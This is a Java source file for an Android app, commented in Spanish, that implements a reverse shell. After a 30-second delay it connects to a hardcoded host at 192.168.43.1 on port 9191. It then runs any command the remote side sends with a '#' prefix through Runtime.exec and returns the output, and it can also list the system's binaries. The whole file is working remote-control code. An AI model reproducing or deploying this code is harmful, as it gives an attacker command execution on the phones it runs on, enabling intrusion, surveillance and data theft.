package com.stringmanolo.rs;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import android.os.SystemClock;
/* Mensajes en la app para debug.
import android.widget.Toast;
*/

public class Conexion {
    public static void Conectar(){
        Thread hilo = new Thread(new Runnable() {
            @Override
            public void run() {
                Socket socket = new Socket();
               
                /* Intenta establecer una conexión a la dirección y puertos hardcodeados durante timeout*/
                try {
                    SystemClock.sleep(30000);
                    socket.connect(new InetSocketAddress("192.168.43.1", 9191), 10000);
                } catch(Exception errConexion) {
                    /* Muestra el error en un mensaje emergente en la aplicación por motivos de debug.
                    Toast.makeText(getApplicationContext(),errConexion.toString(),Toast.LENGTH_SHORT).show();
                    */
                    android.os.Process.killProcess(android.os.Process.myPid());        
                }
             
                /* Comunicación por el socket */
                try {
                    OutputStream peticion = socket.getOutputStream();
                    String msgInicial = "SISTEMA REMOTO OPERATIVO\nEscribe ayuda para mostrar una lista de comandos disponibles\n";
                    /* Envia el texto al cliente remoto */
                    peticion.write(msgInicial.getBytes("UTF-8"));
                    /* INCLUIR: Escribir info al establecer la conexión para identificar el servidor de forma única */
                    peticion.flush();

                    /* Recibe por el socket el texto a ejecutar */
                    String linea = "";
                    String respuesta = "";
                    BufferedReader buffLeer = new BufferedReader(new InputStreamReader(socket.getInputStream(), "UTF-8"));

                    /* Mientras se reciban datos desde el cliente */
                    while((linea = buffLeer.readLine()) != null) {
                        /* Innecesario, utilizar += en caso de querer loggear input del cliente */
                        respuesta = linea;
                   
                        /* En caso de que el input recibido comienze por # */
                        if (respuesta.charAt(0) == '#') {
                            /* Quita el # para procesar el resto del input recibido */
                            respuesta = respuesta.substring(1);
                            
                            try {
                                /* Pasa el comando directamente a la consola del sistema. */
                                /* CUIDADO: Vas crashear la aplicación si utilizas comandos no permitidos por el sistema. O comandos inexistentes. */
                                /* ALTERNATIVA: Implementa la utilidad o impórtala como librería para manejar las excepciones. */
                                /* PROBLEMA: No utilizar directamente binarios que requiera de input directo desde shell. */
                                /* SOLUCIÓN: La aplicación se reinicia cada X tiempo. Esto soluciona múltiples problemas relacionados con cuelges de servicios del sistema */
                                Process comando = Runtime.getRuntime().exec(respuesta);
                             
                                /* Obtiene el resultado en la consola del sistema del dispositivo generada por el comando. */
                                BufferedReader salidaRemota = new BufferedReader(new InputStreamReader(comando.getInputStream()));

                                String salidaComando = null;
                                /* Mientras se reciba salida del sistema remoto */
                                while((salidaComando = salidaRemota.readLine()) != null) {
                                    /* Añade saltos de linea a la salida tras cada linea. */
                                    salidaComando += "\n";
                                    /* Escribe en el socket */
                                    peticion.write(salidaComando.getBytes("UTF-8"));
                                }
                             
                                } catch(Exception err) {
                                    /* Muestra el error en un mensaje emergente en la aplicación por motivos de debug.
                                    Toast.makeText(getApplicationContext(),err.toString(),Toast.LENGTH_SHORT).show();
                                    */
                                }         
                            }                 
                   
                            /* En caso de que el input recibido sea programas */
                            if (respuesta.trim().equals("programas")) {
                                /* Muestra los binarios disponibles en el sistema. */
                                Process bin = Runtime.getRuntime().exec("ls system/bin");
                                BufferedReader stdInput = new BufferedReader(new InputStreamReader(bin.getInputStream()));
                                String salidaBin = null;
                                while((salidaBin = stdInput.readLine()) != null) {
                                    salidaBin += "\n";
                                    peticion.write(salidaBin.getBytes("UTF-8"));
                                }
                            }
          
                            /* En caso de que el input recibido sea salir */
                            if (respuesta.trim().equals("salir")) {
                                /* Muestra un mensaje antes de salir. */
                                peticion.write("Aplicación Cerrada.\nAdios!\n".getBytes("UTF-8"));
                   
                                /* Cierra el socket aquí o en OnStop */
                                socket.close();
                                /* Finaliza La Aplicación Forzosamente */
                                android.os.Process.killProcess(android.os.Process.myPid());
                            }
                         
                            /* En caso de que el input recibido sea ayuda. */
                            if (respuesta.trim().equals("ayuda")) {
                                /* Muestra el texto. */
                                peticion.write("Acciones Disponibles:\nprogramas\n  Lista todos los binarios preinstalados en el sistema remoto\n\n#comando\n  Ejecuta el comando a continuación del símbolo #, por ejemplo #ls\n\nsalir\n  Cierra la conexión y el programa remoto.\n".getBytes("UTF-8"));
                            }
                        }
                    } catch(Exception errConexion) {
                     /* Es obligatorio capturar la excepción */
                }       
            } /* Fin Runneable */
        }); /* Fin Hilo */
        hilo.start();
    }
}
